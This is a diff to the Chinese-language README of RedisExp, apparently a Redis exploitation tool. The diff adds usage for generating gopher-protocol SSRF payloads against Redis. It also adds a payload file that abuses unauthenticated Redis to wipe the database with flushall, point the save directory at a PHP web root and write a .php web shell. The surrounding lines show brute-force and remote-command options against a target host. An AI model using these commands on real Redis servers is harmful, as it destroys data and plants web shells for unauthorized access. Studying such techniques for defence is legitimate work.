@@ -45,6 +45,10 @@ RedisExp.exe -rhost 192.168.211.131 -brute -pwdf ../pass.txt
 执行 Redis 命令:
 RedisExp.exe -rhost 192.168.211.131 -cli
 
+生成 gopher ssrf redis payload: 
+
+RedisExp.exe -gf 1.txt -gip 127.0.0.1:6379 -gopher
+
 ```
 
 ```
@@ -194,6 +198,29 @@ RedisExp.exe -rhost 192.168.211.131 -brute -pwdf pass.txt
 ![](images/pass.png)
 
 
+
+### 生成 Gopher Payload
+
+redis 未授权写 shell (1.txt)
+
+```
+flushall
+config set dir C:\phpstudy_pro\WWW
+config set dbfilename test.php
+set 'webshell' '<?php phpinfo();?>'
+save
+```
+
+
+
+```
+RedisExp.exe -gf 1.txt -gip 127.0.0.1:6379 -gopher
+```
+
+![](images/gopher.png)
+
+
+
 ### 参考
 
 本工具基于大量优秀文章和工具才得以~~编写~~ 抄写完成，非常感谢这些无私的分享者！
@@ -203,6 +230,7 @@ RedisExp.exe -rhost 192.168.211.131 -brute -pwdf pass.txt
 - https://github.com/r35tart/RedisWriteFile
 - https://github.com/toalaska/redis_tool
 - https://yanghaoi.github.io/2021/10/09/redis-lou-dong-li-yong/
+- https://github.com/firebroo/sec_tools/tree/master/redis-over-gopher
 
  
 
